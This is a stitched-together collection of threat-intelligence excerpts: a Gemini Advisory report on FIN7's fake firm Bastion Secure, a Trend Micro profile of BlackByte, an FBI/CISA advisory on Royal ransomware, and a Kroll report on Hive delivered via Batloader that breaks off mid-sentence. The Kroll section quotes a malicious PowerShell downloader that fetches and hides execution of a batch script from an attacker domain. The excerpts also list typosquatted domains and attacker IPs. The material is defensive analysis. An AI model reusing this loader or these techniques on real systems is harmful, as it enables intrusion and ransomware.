using\nThe employee was required to use specific tools to avoid detection\nBastion Secure software was purportedly licensed to “Checkpoint Software Inc”, which\nmay have been an attempt to masquerade the software as a product of the legitimate\ncompany Check Point Software Technologies Ltd. Security researchers have\npreviously reported that FIN7 has attempted to do this in the past as well.\n\nAttribution\n\nGemini analyzed the files that were sent to the source by Bastion Secure and found that the\nfiles contained components for the post-exploitation tools Carbanak and Lizar/Tirion. Post-\nexploitation tools—which are part of any ransomware group’s toolkit—allow malicious actors\nto control infected computers after they have gained initial access to the victim company’s\nnetwork. Various security practitioners have previously attributed the use of Carbanak and\nLizar/Tirion to FIN7. These two factors indicate that FIN7 operators are sharing a partially\ndisguised version of its toolkit with unwitting accomplices through the fake company Bastion\nSecure.\n\nThe files provided to the source by Bastion Secure included files for a software component\ntitled “Command Manager” that was, in fact, a disguised version of the client component of\nCarbanak (see image 12). Gemini determined this by analyzing the software’s functionality\nand concluded that it is an updated version of previously identified versions of Carbanak.\nThe main functions of the Carbanak command manager are collecting information about an\ninfected computer and obtaining remote access to the infected computer.\n\nhttps://www.checkpoint.com/\nhttps://threatpost.com/fin7-backdoor-ethical-hacking-tool/166194/\nhttps://threatpost.com/fin7-backdoor-ethical-hacking-tool/166194/\nhttps://attack.mitre.org/software/S0030/\n\n\n12/13\n\nImage 12: Command Manager control panel, which is actually a disguised client component\nof Carbanak.\n\nThe files contained an obfuscated PowerShell script that ultimately launches the Lizar/Tirion\ninjector and payload. The primary function of the loader is to receive periodic commands\nfrom the C&C server and execute the commands on the infected computer. The commands\nexecuted by the loader on the infected computer are “modules” and the results are sent back\nto the C&C server. These modules can be .dll, .exe, and .ps1 file types.\n\nImage 13: The malware operator uses the client to issue commands to the loader, which is\nlocated on the infected machine.\n\nConclusion\n\nAlthough cybercriminals looking for unwitting accomplices on legitimate job sites is nothing\nnew, the sheer scale and blatancy with which FIN7 operates continue to surpass the\nbehavior shown by other cybercriminal groups. Not only is FIN7 looking for unwitting victims\non legitimate job sites, but also attempting to obfuscate its true identity as a prolific\ncybercriminal and ransomware group by creating a fabricated web presence through a\nlargely legitimate-appearing website, professional job postings, and company info pages on\nRussian-language business development sites.\n\nhttps://geminiadvisory.io/wp-content/uploads/2021/10/img9.png\nhttps://geminiadvisory.io/wp-content/uploads/2021/10/img10.png\n\n\n13/13\n\nFIN7’s decision to hire unwitting accomplices, as opposed to finding willing accomplices on\nthe dark web, is likely due to greed. With willing accomplices, FIN7 would be forced to share\na percentage of ransom payments totaling millions of dollars, whereas unwitting “employees”\nwould work for monthly salaries in the low thousands, which are commensurate with the\nlabor markets in post-Soviet states. However, FIN7’s greed also afforded Gemini a view into\nthe proprietary tools of this prolific threat team, as well as the exposure of another fake FIN7\ncompany.\n\nCorrection (11/05/2021): The report incorrectly stated that a FIN7 system administrator was\narrested in 2021. The individual was arrested in 2018 and sentenced in 2021. Four FIN7\nmembers were arrested between 2018 and 2020.\n\nGemini Advisory Mission Statement\n\nGemini Advisory provides actionable fraud intelligence to the largest financial organizations\nin an effort to mitigate ever-growing cyber risks.

Like its contemporaries, it has gone after critical\ninfrastructure for a higher chance of a getting a payout. What techniques set it apart? \n\n View infographic of \"Ransomware Spotlight: BlackByte\"\n\nhttps://www.trendmicro.com/vinfo/my/security/news/ransomware-spotlight/ransomware-spotlight-blackbyte\nhttps://documents.trendmicro.com/images/TEx/articles/RS-BlackByte-Infographic-EHGnsy5w1.jpg\n\n\n2/11\n\nBlackByte debuted in July 2021. Its first year of activity garnered the attention of the Federal Bureau of Investigation (FBI) and the US Secret\nService (USS). According to a joint advisory by these two government agencies, BlackByte had already gone after at least three US critical\ninfrastructure sectors (government facilities, financial, and food and agriculture) by November 2021.\n\nThis advisory shows just how BlackByte was actively establishing itself as a new noteworthy ransomware variant. On October 2021, Trustwave\nreleased a publicly available decrypter for BlackByte. This however did not stop BlackByte as developers released newer versions that used\nmultiple keys and ramped up operations, going as far as to warn their victims against using the available decrypter on their website.\n\nBlackByte’s emergence could be part of a larger scheme. With the purported shut down of Conti, researchers from AdvIntel surmise that\nBlackByte is one of the chief new ransomware variants part of its rebranding.\n\nAt present, BlackByte continues to target organizations from all over the world. However, like LockBit, RansomEXX, and many other\nransomware families, BlackByte avoids attacking Russia-based entities.\n\nWhat do organizations need to know about BlackByte?\n\n\n\n\nWhile BlackByte operators use their piece of ransomware in attacks for their own gain, they also run on a ransomware-as-a-service (RaaS)\nmodel for their affiliates. We have listed down the key highlights of BlackByte here:\n\nInitial versions used symmetric keys. The earlier variant of BlackByte used the same key in each campaign to encrypt files. It also\nused AES, a symmetric key algorithm. This allowed researchers to create a decrypter to help BlackByte victims, thus forcing the group to\nchange their encryption method in newer variants.\nIt has multiple variants. The first known version of BlackByte was written in C#. Operators then released two Go-based variants. The\nmore recent Go-variant was introduced around February 2022 and sported modifications particularly in its encryption algorithm.\nArchives files using WinRAR. In BlackByte campaigns data exfiltration is done before the ransomware is deployed. This is because the\nBlackByte ransomware is incapable of exfiltrating data, instead it archives files using WinRAR then uploads the file to sharing sites. \nUses trojanized legitimate tools. Like most modern ransomware variants, BlackByte uses living-off-the-land binaries. For example, it\nuses the remote tool AnyDesk to gain further control over a system and for lateral movement.\nInvolves phishing emails or a known ProxyShell vulnerability for initial access. BlackByte has been known to use phishing emails\nor exploit unpatched ProxyShell vulnerability in Microsoft Exchange Servers to gain initial access into a system.\n\nBlackByte trajectory seems to point to continuing activity. In fact, reports indicate that BlackByte is among the ransomware operations that\nhave set their sights on Latin American governments in May 2022. This report is reflected in our own telemetry data as seen in the next\nsection.\n\nTop affected industries and countries\n\nThe data used in this section represent the count of unique machines where BlackByte-related activity had been detected. Based on our\ntelemetry data, BlackByte showed a fairly consistent level of activity from October 2021 to March 2022. However, May 2022 detections showed\na drastic uptick in number.\n\nFigure 1. BlackByte monthly unique detections  (October 1, 2021 to May 31, 2022)\n\nSource: Trend Micro™ Smart Protection Network™\n\nBased on our telemetry data from April 30, 2021 to May 31, 2022, we detected BlackByte activity all over the globe. However, after the spike in\nactivity in May, Peru outstripped other countries in detection. This is consistent with the reported escalation of ransomware attacks in Latin\nAmerica, where BlackByte was also reportedly among those that targeted the region.  \n\n\n\n\nhttps://www.ic3.gov/Media/News/2022/220211.pdf\nhttps://www.trendmicro.com/vinfo/my/security/definition/ransomware\nhttps://www.trustwave.com/en-us/resources/blogs/spiderlabs-blog/blackbyte-ransomware-pt-1-in-depth-analysis/\nhttps://www.theregister.com/2022/05/19/blackbyte-ransomware-attacks/\nhttps://www.trendmicro.com/vinfo/my/security/news/ransomware-spotlight/ransomware-spotlight-conti\nhttps://www.advintel.io/post/hydra-with-three-heads-blackbyte-the-future-of-ransomware-subsidiary-groups\nhttps://www.trendmicro.com/vinfo/my/security/news/ransomware-spotlight/ransomware-spotlight-lockbit\nhttps://www.trendmicro.com/vinfo/my/security/news/ransomware-spotlight/ransomware-spotlight-ransomexx\nhttps://www.trendmicro.com/vinfo/my/security/news/cybercrime-and-digital-threats/locked-loaded-and-in-the-wrong-hands-legitimate-tools-weaponized-for-ransomware-in-2021\nhttps://www.recordedfuture.com/latin-american-governments-targeted-by-ransomware\nhttps://documents.trendmicro.com/images/TEx/articles/RS-BlackByte-Fig-1-HYAXKRn.png\nhttps://www.recordedfuture.com/latin-american-governments-targeted-by-ransomware\n\n\n3/11\n\nFigure 2. Countries with the highest number of attack attempts for the BlackByte ransomware (April 30, 2021 to May 30, 2022)\nSource: Trend Micro Smart Protection Network\n\nUp to the end of April 2022, the technology sector saw the most BlackByte detections, however, in May, detections in the government sector\nalso shot up.\n\nFigure 3. Countries with the highest number of attack attempts for the BlackByte ransomware (April 30, 2021 to May 30, 2022)\n\nSource: Trend Micro Smart Protection Network\n\nOne way to interpret these observations is that the drastic increase stemmed from a single attack that affected several machines. Aside from\nthe reports on ransomware groups targeting Latin America, this explanation is also based on the report that, by their own claim, BlackByte\noperators had compromised a Peruvian government entity around the time of the increased activity.\n\nTargeted regions and sectors according to BlackByte leaksite\n\nIn addition to these detections, we delved into BlackByte’s leak site to see the number of attacks recorded there. We looked at data from\nAugust 1, 2021 to May 31, 2022. Based on what we found in the site, BlackByte’s victims were composed mostly of small size businesses. The\nactivity peaked in November 2021.\n\nOverall, the leak site has yet to reflect the focused attack on Latin American governments. The distribution of their attacks per region showed,\ninstead, a proclivity for targeting entities based in North America and Europe. \n\nhttps://documents.trendmicro.com/images/TEx/articles/RS-BlackByte-Fig-2-0fWUgZy.png\nhttps://documents.trendmicro.com/images/TEx/articles/RS-BlackByte-Fig-3-fTWT0rk.png\n\n\n4/11\n\nFigure 4. Regional distribution of BlackByte victims according to the group’s leak site (August 1, 2021 to May 31, 2022)\n\nBased on the leak site data alone, BlackByte operators and their affiliates have yet to show a marked interest in any one sector. We found a\nrelatively even distribution of attacks across industries, which included the following:\n\nConstruction\nMaterials\nHealthcare\nRetail\nTransportation\nEnergy & Utilities\nManufacturing\nProfessional services\nAutomobile\nCommunity\nFoods & Staples\nReal Estate\nGovernment\nIT\nLegal services\nMedia and entertainment\n\nComparing the leak site data of BlackByte to other ransomware families, shows that from January 1, 2022 to May 31, 2022, BlackByte was\namong the 10 ransomware groups with the greatest number of self-reported victims.\n\nFigure 5. Top ransomware groups with the greatest number of listed victims in their respective leak sites (January 1, 2022 to May 31, 2022)\n\nThe data seems to show that BlackByte's operation is beginning to build a name for itself in the threat landscape while still building\nmomentum. The following section shows how it works and how it conducts its attacks.\n\nInfection chain and techniques\n\nGiven that BlackByte operates on the RaaS model, its infection chain can vary depending on the target. \n\nhttps://documents.trendmicro.com/images/TEx/articles/RS-BlackByte-Fig-4-Eswra13.png\nhttps://documents.trendmicro.com/images/TEx/articles/RS-BlackByte-Fig-5-MBFGTGm.png\n\n\n5/11\n\nFigure 6. BlackByte infection chain\n\n\n\n\nInitial Access\n\nBlackByte can arrive in a system by exploiting the ProxyShell vulnerabilities. Exploiting the vulnerable server allows the attacker to create\na web shell to the system which is then used to download and drop Cobeacon using Certutil.\nAfter the initial access into the system, the attackers use Certutil to download and execute the components that it needs to propagate in\nthe network.\nAfter the deployment of Cobeacon, it is then used to execute BlackByte ransomware.\n\n\n\n\nDiscovery and Lateral Movement\n\nBased on our data, the actors used NetScan as a network discovery tool that allows the attackers to get a good view of the victim’s\nnetwork environment.\nAfter network reconnaissance, the attackers deploy AnyDesk in the system for an additional level of control over the system. The\nattackers repeat this process of discovery and deployment of Cobeacon and AnyDesk until it achieves its goals.\nDuring the execution of BlackByte, it terminates certain processes and services related to security application to evade detection.\n\n\n\n\nExfiltration\n\nOnce the attackers have sufficiently infiltrated into the victim’s network and identified valuable files, it exfiltrates them using WinRar to\narchive the files and upload them into file sharing sites such as anonymfiles[.]com and file[.]io.\n\n\n\n\nImpact\n\nhttps://documents.trendmicro.com/images/TEx/articles/RS-BlackByte-Fig-6-wLJOoZX.png\n\n\n6/11\n\nOnce the ransomware is executed, it terminates certain services and processes related to security application to evade detections. It also\nconnects to its C&C server where it looks for a certain PNG file that contains information critical to encryption and is used to derive the\nAES128 key. This key is then protected using an embedded RSA key which will then become undecryptable without the private key. The\nransomware then deletes shadow copies in the system using vssadmin.\n\nFigure 7.

Like many newer\nransomware families, BlackByte is readying itself to take the spot of any big-game ransomware operation in decline. However, underneath it all\ncould be a more intricate scheme of threat groups dispersing under new monikers. \n\nAs with the case of BlackByte, knowing its notable tactics, while also staying knowledgeable of bigger trends can help organizations create an\neffective strategy for ransomware attacks. In the case of BlackByte, prevention is key by keeping employees wary of phishing tactics and\nkeeping up with security patches such as those for ProxyShell vulnerabilities.\n\nTo help defend systems against similar threats, organizations can establish security frameworks that can allocate resources systematically for\nestablishing solid defenses against ransomware.\n\nHere are some best practices that can be included in these frameworks:\n\n\n\n\n\n\n\nAudit and inventory\n\nTake an inventory of assets and data\nIdentify authorized and unauthorized devices and software\nMake an audit of event and incident logs\n\n\n\n\nConfigure and monitor\n\nManage hardware and software configurations\nGrant admin privileges and access only when necessary to an employee’s role\nMonitor network ports, protocols, and services\nActivate security configurations on network infrastructure devices such as firewalls and routers\nEstablish a software allowlist that only executes legitimate applications\n\n\n\n\nPatch and update\n\nConduct regular vulnerability assessments\nPerform patching or virtual patching for operating systems and applications\nUpdate software and applications to their latest versions\n\n\n\n\nProtect and recover\n\n\n\n11/11\n\nImplement data protection, back up, and recovery measures\nEnable multifactor authentication (MFA)\n\n\n\n\nSecure and defend\n\nEmploy sandbox analysis to block malicious emails\nDeploy the latest versions of security solutions to all layers of the system, including email, endpoint, web, and network\nDetect early signs of an attack such as the presence of suspicious tools in the system\nUse advanced detection technologies such as those powered by AI and machine learning\n\n\n\n\nTrain and test\n\nRegularly train and assess employees' security skills\nConduct red-team exercises and penetration tests\n\nA multilayered approach can help organizations guard possible entry points into the system (endpoint, email, web, and network). Security\nsolutions that can detect malicious components and suspicious behavior can also help protect enterprises.\n\nTrend Micro Vision One™ provides multilayered protection and behavior detection, which helps block questionable behavior and tools\nearly on before the ransomware can do irreversible damage to the system.\nTrend Micro Cloud One™ Workload Security protects systems against both known and unknown threats that exploit vulnerabilities. This\nprotection is made possible through techniques such as virtual patching and machine learning. \nTrend Micro™ Deep Discovery™ Email Inspector employs custom sandboxing and advanced analysis techniques to effectively block\nmalicious emails, including phishing emails that can serve as entry points for ransomware.\nTrend Micro Apex One™ offers next-level automated threat detection and response against advanced concerns such as fileless threats\nand ransomware, ensuring the protection of endpoints.\n\nIndicators of Compromise (IOCs)\n\nThe IOCs for this article can be found here.

FBI and CISA believe this variant, which uses its own\ncustom-made file encryption program, evolved from earlier iterations that used “Zeon” as a loader. After\ngaining access to victims’ networks, Royal actors disable antivirus software and exfiltrate large amounts of\ndata before ultimately deploying the ransomware and encrypting the systems. Royal actors have made\nransom demands ranging from approximately $1 million to $11 million USD in Bitcoin. In observed incidents,\nRoyal actors do not include ransom amounts and payment instructions as part of the initial ransom note.\nInstead, the note, which appears after encryption, requires victims to directly interact with the threat actor via\na .onion URL (reachable through the Tor browser). Royal actors have targeted numerous critical\ninfrastructure sectors including, but not limited to, Manufacturing, Communications, Healthcare and Public\nHealthcare (HPH), and Education.\n\nFBI and CISA encourage organizations to implement the recommendations in the Mitigations section of this\nCSA to reduce the likelihood and impact of ransomware incidents.\n\nDownload the PDF version of this report:\n\n#StopRansomware: Royal Ransomware\n(PDF, 586.96 KB\n)\n\nhttps://www.cisa.gov/news-events/cybersecurity-advisories/aa23-061a\nhttps://www.cisa.gov/stopransomware\nhttps://www.cisa.gov/stopransomware\nhttps://www.cisa.gov/known-exploited-vulnerabilities-catalog\nhttps://www.cisa.gov/phishing-infographic\nhttps://www.cisa.gov/mfa\nhttps://cisa.gov/uscert/ncas/alerts/aa20-183a\nhttps://www.cisa.gov/topics/critical-infrastructure-security-and-resilience/critical-infrastructure-sectors\nhttps://www.cisa.gov/sites/default/files/2023-03/aa23-061a-stopransomware-royal-ransomware_0.pdf\n\n\n2/11\n\nFor a downloadable copy of IOCs, see\n\nAA23-061A STIX XML\n(XML, 114.26 KB\n)\n\nTECHNICAL DETAILS\n\nNote: This advisory uses the MITRE ATT&CK® for Enterprise framework, version 12. See MITRE ATT&CK\nfor Enterprise for all referenced tactics and techniques.\n\nRoyal ransomware uses a unique partial encryption approach that allows the threat actor to choose a\nspecific percentage of data in a file to encrypt. This approach allows the actor to lower the encryption\npercentage for larger files, which helps evade detection.[1] In addition to encrypting files, Royal actors also\nengage in double extortion tactics in which they threaten to publicly release the encrypted data if the victim\ndoes not pay the ransom.\n\nInitial Access\n\nRoyal actors gain initial access to victim networks in a number of ways including: \n\nPhishing. According to third-party reporting, Royal actors most commonly (in 66.7% of incidents) gain\ninitial access to victim networks via successful phishing emails [T1566].\n\nAccording to open-source reporting, victims have unknowingly installed malware that delivers\nRoyal ransomware after receiving phishing emails containing malicious PDF\ndocuments [T1566.001], and malvertising [T1566.002].[2]\n\nRemote Desktop Protocol (RDP). The second most common vector Royal actors use (in 13.3% of\nincidents) for initial access is RDP compromise.  \nPublic-facing applications. FBI has also observed Royal actors gain initial access through exploiting\npublic-facing applications [T1190]. \nBrokers. Reports from trusted third-party sources indicate that Royal actors may leverage brokers to\ngain initial access and source traffic by harvesting virtual private network (VPN) credentials from stealer\nlogs. \n\nCommand and Control\n\nOnce Royal actors gain access to the network, they communicate with command and control (C2)\ninfrastructure and download multiple tools [T1105]. Legitimate Windows software is repurposed by Royal\noperators to strengthen their foothold in the victim’s network. Ransomware operators often use open-source\nprojects to aid their intrusion activities; Royal operators have recently been observed using Chisel, a\ntunneling tool transported over HTTP and secured via SSH [T1572], to communicate with their C2\ninfrastructure. FBI has observed multiple Qakbot C2s used in Royal ransomware attacks, but has not yet\ndetermined if Royal ransomware exclusively uses Qakbot C2s.\n\nLateral Movement and Persistence\n\nRoyal actors often use RDP to move laterally across the network [T1021.001]. Microsoft Sysinternals tool\nPsExec has also been used to aid lateral movement. FBI has observed Royal actors using remote monitoring\nand management (RMM) software, such as AnyDesk, LogMeIn, and Atera, for persistence in the victim’s\nnetwork [T1133]. In some instances, the actors moved laterally to the domain controller. In one confirmed\ncase, the actors used a legitimate admin account to remotely log on to the domain controller [T1078]. Once\non the domain controller, the threat actor deactivated antivirus protocols [T1562.001] by modifying Group\nPolicy Objects [T1484.001].\n\nExfiltration\n\nhttps://www.cisa.gov/sites/default/files/2023-03/aa23-061a.stix__0.xml\nhttps://attack.mitre.org/versions/v11/matrices/enterprise/\nhttps://www.cybereason.com/blog/royal-ransomware-analysis\nhttps://attack.mitre.org/versions/v12/techniques/T1566/\nhttps://attack.mitre.org/versions/v12/techniques/T1566/001/\nhttps://attack.mitre.org/versions/v12/techniques/T1566/002/\nhttps://www.microsoft.com/en-us/security/blog/2022/11/17/dev-0569-finds-new-ways-to-deliver-royal-ransomware-various-payloads/\nhttps://attack.mitre.org/versions/v12/techniques/T1190/\nhttps://attack.mitre.org/versions/v12/techniques/T1105/\nhttps://attack.mitre.org/versions/v12/techniques/T1572/\nhttps://attack.mitre.org/versions/v12/techniques/T1021/001/\nhttps://attack.mitre.org/versions/v12/techniques/T1133/\nhttps://attack.mitre.org/versions/v12/techniques/T1078\nhttps://attack.mitre.org/versions/v12/techniques/T1562/001/\nhttps://attack.mitre.org/versions/v12/techniques/T1484/001/\n\n\n3/11\n\nRoyal actors exfiltrate data from victim networks by repurposing legitimate cyber pentesting tools, such as\nCobalt Strike, and malware tools and derivatives, such as Ursnif/Gozi, for data aggregation and exfiltration.\nAccording to third-party reporting, Royal actors’ first hop in exfiltration and other operations is usually a U.S.\nIP address.\n\nNote: In reference to Cobalt Strike and other tools mentioned above, a tool repository used by Royal was\nidentified at IP: 94.232.41[.]105 in December 2022.\n\nEncryption\n\nBefore starting the encryption process, Royal actors: \n\nUse Windows Restart Manager to determine whether targeted files are currently in use or blocked by\nother applications [T1486].[1] \nUse Windows Volume Shadow Copy service (vssadmin.exe) to delete shadow copies to prevent\nsystem recovery.[1]  \n\nFBI has found numerous batch (.bat) files on impacted systems which are typically transferred as an\nencrypted 7zip file. Batch files create a new admin user [T1078.002], force a group policy update, set\npertinent registry keys to auto-extract [T1119] and execute the ransomware, monitor the encryption process,\nand delete files upon completion—including Application, System, and Security event logs [T1070.001].\n\nMalicious files have been found in victim networks in the following directories:\n\nC:\\Temp\\  \n\nC:\\Users\\<user>\\AppData\\Roaming\\  \n\nC:\\Users\\<users>\\ \n\nC:\\ProgramData\\\n\nIndicators of Compromise (IOC)\n\nSee table 1 and 2 for Royal ransomware IOCs that FBI obtained during threat response activities as of\nJanuary 2023. Note: Some of the observed IP addresses are several months old. FBI and CISA recommend\nvetting or investigating these IP addresses prior to taking forward-looking action, such as blocking.\n\nTable 1: Royal Ransomware Associated Files, Hashes, and IP addresses as

potential adversarial use\nof common system and network discovery techniques and to reduce the risk of compromise by Royal\nransomware. These mitigations follow CISA’s Cybersecurity Performance Goals (CPGs), which provide a\nminimum set of practices and protections that are informed by the most common and impactful threats,\ntactics, techniques, and procedures, and which yield goals that all organizations across critical infrastructure\nsectors should implement:\n\nhttps://attack.mitre.org/versions/v12/techniques/T1078/002/\nhttps://attack.mitre.org/versions/v12/techniques/T1562/001/\nhttps://attack.mitre.org/versions/v12/techniques/T1484/001/\nhttps://attack.mitre.org/versions/v12/techniques/T1070/001/\nhttps://attack.mitre.org/versions/v12/techniques/T1021/001/\nhttps://attack.mitre.org/versions/v12/techniques/T1119/\nhttps://attack.mitre.org/versions/v12/techniques/T1486/\nhttps://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf\n\n\n10/11\n\nImplement a recovery plan to maintain and retain multiple copies of sensitive or proprietary data and\nservers [CPG 7.3] in a physically separate, segmented, and secure location (i.e., hard drive, storage\ndevice, the cloud).\nRequire all accounts with password logins (e.g., service account, admin accounts, and domain admin\naccounts) to comply with National Institute for Standards and Technology (NIST) standards for\ndeveloping and managing password policies [CPG 3.4].\n\nUse longer passwords consisting of at least 8 characters and no more than 64 characters in\nlength [CPG 1.4].\nStore passwords in hashed format using industry-recognized password managers.\nAdd password user “salts” to shared login credentials.\nAvoid reusing passwords.\nImplement multiple failed login attempt account lockouts [CPG 1.1].\nDisable password hints.\nRefrain from requiring password changes more frequently than once per year. Note: NIST\nguidance suggests favoring longer passwords instead of requiring regular and frequent password\nresets. Frequent password resets are more likely to result in users developing password patterns\ncyber criminals can easily decipher. \nRequire administrator credentials to install software.\n\nRequire multifactor authentication [CPG 1.3] for all services to the extent possible, particularly for\nwebmail, virtual private networks, and accounts that access critical systems. \nKeep all operating systems, software, and firmware up to date. Timely patching is one of the most\nefficient and cost-effective steps an organization can take to minimize its exposure to cybersecurity\nthreats. \nSegment networks [CPG 8.1]. Network segmentation can help prevent the spread of ransomware by\ncontrolling traffic flows between—and access to—various subnetworks and by restricting adversary\nlateral movement. \nIdentify, detect, and investigate abnormal activity and potential traversal of the indicated\nransomware with a networking monitoring tool. To aid in detecting ransomware, implement a tool\nthat logs and reports all network traffic [CPG 5.1], including lateral movement activity on a network.\nEndpoint detection and response (EDR) tools are useful for detecting lateral connections as they have\ninsight into common and uncommon network connections for each host. \nInstall, regularly update, and enable real time detection for antivirus software on all hosts.\nReview domain controllers, servers, workstations, and active directories for new and/or\nunrecognized accounts.\nAudit user accounts with administrative privileges and configure access controls according to the\nprinciple of least privilege [CPG 1.5].\nDisable unused ports.\nConsider adding an email banner to emails [CPG 8.3] received from outside your organization.\nImplement time-based access for accounts set at the admin level and higher. For example, the\nJust-in-Time (JIT) access method provisions privileged access when needed and can support\nenforcement of the principle of least privilege (as well as the Zero Trust model). This is a process\nwhere a network-wide policy is set in place to automatically disable admin accounts at the Active\nDirectory level when the account is not in direct need. Individual users may submit their requests\nthrough an automated process that grants them access to a specified system for a set timeframe when\nthey need to support the completion of a certain task. \nDisable command-line and scripting activities and permissions. Privilege escalation and lateral\nmovement often depend on software utilities running from the command line. If threat actors are not\nable to run these tools, they will have difficulty escalating privileges and/or moving laterally. \n\nhttps://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf\nhttps://pages.nist.gov/800-63-3/\nhttps://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf\nhttps://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf\nhttps://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf\nhttps://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf\nhttps://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf\nhttps://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf\nhttps://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf\nhttps://www.cisa.gov/sites/default/files/publications/2022_00092_CISA_CPG_Report_508c.pdf\n\n\n11/11\n\nMaintain offline backups of data, and regularly maintain backup and restoration [CPG 7.3]. By\ninstituting this practice, the organization ensures they will not be severely interrupted, and/or only have\nirretrievable data. \nEnsure all backup data is encrypted, immutable (i.e., cannot be altered or deleted), and covers the\nentire organization’s data infrastructure [CPG 3.3].\n\nRESOURCES\n\nStopransomware.gov is a whole-of-government approach that gives one central location for\nransomware resources and alerts.\nResource to mitigate a ransomware attack: CISA-Multi-State Information Sharing and Analysis Center\n(MS-ISAC) Joint Ransomware Guide.\nNo-cost cyber hygiene services: Cyber Hygiene Services and Ransomware Readiness Assessment.\n\nREPORTING\n\nFBI is seeking any information that can be shared, to include boundary logs showing communication to and\nfrom foreign IP addresses, a sample ransom note, communications with Royal actors, Bitcoin wallet\ninformation, decryptor files, and/or a benign sample of an encrypted file.\n\nAdditional details requested include: a targeted company Point of Contact, status and scope of infection,\nestimated loss, operational impact, transaction IDs, date of infection, date detected, initial attack vector, host\nand network based indicators.\n\nFBI and CISA do not encourage paying ransom as payment does not guarantee victim files will be\nrecovered. Furthermore, payment may also embolden adversaries to target additional organizations,\nencourage other criminal actors to engage in the distribution of ransomware, and/or fund illicit activities.\nRegardless of whether you or your organization have decided to pay the ransom, FBI and CISA urge you to\npromptly report ransomware incidents to a local FBI Field Office, or CISA at https://www.cisa.gov/report.\n\nDISCLAIMER\n\nThe information in this report is being provided “as is” for informational purposes only.

A new trend of initial infection vector (IIV) has been identified by Kroll\nanalysts that may relate to the increase of activity and the varying nature of targets. Across a\nnumber of incidents, the IIV was attributed to IT administrators looking to download common\nsoftwares from Google such as TeamViewer, Zoom and AnyDesk, and they were provided\nwith advertisements for these tools at the top of their search results. We recently reported on\nthis trend, where threat actors were abusing Google Ads to deploy malware via downloads.\n\nWhen these IT administrators downloaded the desired “tools” from the malicious ad links,\nBatloader was also unknowingly delivered. Batloader is an initial access malware utilized to\ndeliver tools such as Zloader, Ursnif and Vidar to further establish the threat actor’s foothold\nwithin a network. Cobalt Strike can then be installed to maintain command and control. Once\nthe threat actor has acquired credentials and identified sensitive files for exfiltration, they are\nable to utilize common exfiltration tools such as WinSCP and Rclone to extract a victim’s\n\nhttps://www.kroll.com/en/insights/publications/cyber/threat-actors-google-ads-deploy-vidar-stealer\nhttps://www.kroll.com/en/insights/publications/cyber/new-m365-business-email-compromise-attacks-with-rclone\n\n\n3/18\n\ndata. The ransomware binary is then executed with a specific identifiable encryption key and\nthis is used to create the ransom note named “HOW_TO_DECRYPT.txt” and appends a\nspecific file extension related to a dropped key file within the root of C:\\.\n\nA login is provided for the victim to access the Hive “Sales Department” onion site, and if\ndemands are not met, data is then shared on their “Hive Leak” onion site.\n\nTimeline of Incident\n\nInitial Exploit\n\nIn a recent case, after the IT administrator searched for TeamViewer and clicked the\nadvertisement link, they were directed to https://caroseyama[.]xyz/9hjLXZR?\nhttps://www.teamviewer[.]com/en/customer-support. This link then redirected to\nhttps://teamviewclouds[.]com/index.php. Our experts analyzed the teamviewclouds domain\nand identified a large number of similar typosquatted domains for a wide range of common\nsoftware hosted on the same IP address and hosted by regprivate[.]ru.    Most of these\ndomains were inactive, which suggests that the threat actors are continually creating new\nadvertisements. An installation file is then provided from\nhttps://dc444.4sync[.]com/download/fXx-c_iZ/InstallerV36__218_.zip, which is the Batloader\n.msi file. The file sharing provider 4sync has been identified across separate Batloader\nincidents and appears to serve the Batloader .msi download.\n\nzoomyclouds[.]com, zoomedes[.]com, zohosz[.]com, teamviewerq[.]com, teamviewer-\ncloudcomputing[.]com, teamviewclous[.]com, teamviewclouds[.]com, \nteamcloudcomputing[.]com, staroness[.]com, standartnotess[.]com, slackicorp[.]com, \nprogrammbatcheck[.]com, openofficee[.]com, logmein-cloud[.]com, logcloudmein[.]com, \ngimpimage[.]com, foxitr[.]com, fortinetq[.]com, fidelyclouds[.]com, \nevernotcorp[.]com, dom82[.]net, cloudsslack[.]com, anydeskos[.]com, anydeskis[.]com, \nanyclouddesk[.]com, adubecorp[.]com\n\nFigure 1: Example of Typosquatted domains associated with teamviewclouds[.]com\n\n\n\n4/18\n\nThe installer itself installed novaPDF by Softland rather than TeamViewer and dropped\nPowerShell scripts “scrED95.ps1” and “pssEDC6.ps1”. “pssEDC6.ps1” is a conversion script\nthat creates the initial downloader script “scrED95.ps1”. This script downloads the initial\nBatloader script “update.bat” and sets the working directory to the user’s appdata local\ndirectory. The scripts are executed by PowerShell as shown in figure 2.\n\npowershell.exe -NoProfile -Noninteractive -ExecutionPolicy Bypass -File \n\"C:\\Users\\user\\AppData\\Local\\Temp\\pssEDC6.ps1\" -propFile \n\"C:\\Users\\user\\AppData\\Local\\Temp\\msiED94.txt\" -scriptFile \n\"C:\\Users\\user\\AppData\\Local\\Temp\\scrED95.ps1\" -scriptArgsFile \n\"C:\\Users\\user\\AppData\\Local\\Temp\\scrED96.txt\" -propSep \" :<->: \" -testPrefix \n\"_testValue.\"\n\nFigure 2: PowerShell command to create initial downloader\n\nSet-Location \"$Env:USERPROFILE\\AppData\\Roaming\"\n\nInvoke-RestMethod -Uri \nhttps://cloudupdatesss[.]com/g5i0nq/index/e6a5614c379561c94004c531781ee1c5/?\nservername=msi -OutFile update.bat\n\nStart-Process -WindowStyle hidden -FilePath \n\"$Env:USERPROFILE\\AppData\\Roaming\\update.bat\n\nFigure 3: scrED95.ps1\n\nMITRE ATT&CK: T1583.001: Acquire Domain Names\n\nMITRE ATT&CK: T1608.004: Stage Capabilities - Drive-by Target\n\nMITRE ATT&CK: T1588: Obtain Capabilities\n\nMITRE ATT&CK: T1189: Drive-by Compromise\n\nToolkit Deployment and Escalation\n\nTo maintain persistence and to gain increased privileges, Hive actors leverage Batloader to\ndownload Ursnif and Vidar, but also attempt to gain the highest privileges possible to install\nthe malware. The initial Batloader script downloads “requestadmin.bat” and attempts to\nexecute it with 